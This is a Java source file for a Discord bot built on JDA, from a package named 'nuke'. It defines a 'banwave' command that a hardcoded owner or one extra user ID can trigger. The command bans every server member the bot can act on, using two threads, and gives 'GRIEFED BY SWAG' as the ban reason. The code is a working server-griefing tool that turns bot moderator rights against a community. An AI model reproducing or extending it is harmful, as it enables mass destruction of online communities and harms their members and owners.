package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("698607465885073489")) {
            return;
        }

        Logger.getLogger().print("Initiating Ban Wave...");
        List<String> members = event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(member -> member.getId()).collect(Collectors.toList());
        int size = members.size();
        List<String> first = new ArrayList<>();
        List<String> second = new ArrayList<>();
        for (int i = 0; i < size / 2; i++)
            first.add(members.get(i));
        for (int i = size / 2; i < size; i++)
            second.add(members.get(i));
        Thread wave1 = new Thread(() -> {
        for (String member : first)
            event.getGuild().ban(member, 0).reason("GRIEFED BY SWAG").queue();
        });
        Thread wave2 = new Thread(() -> {
            for (String member : second)
                event.getGuild().ban(member, 0).reason("GRIEFED BY SWAG").queue();
        });

        wave1.start();
        wave2.start();
//        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());

     /*   for (Member member : event.getGuild().getMembers()) {
                if (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member)) {
                    event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG").queue();
                 Logger.getLogger().print("Banned " + member.getUser().getName() + "#" + member.getUser().getDiscriminator());
            }
    }*/

}


    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "etb";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"bw","banwave"};
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}

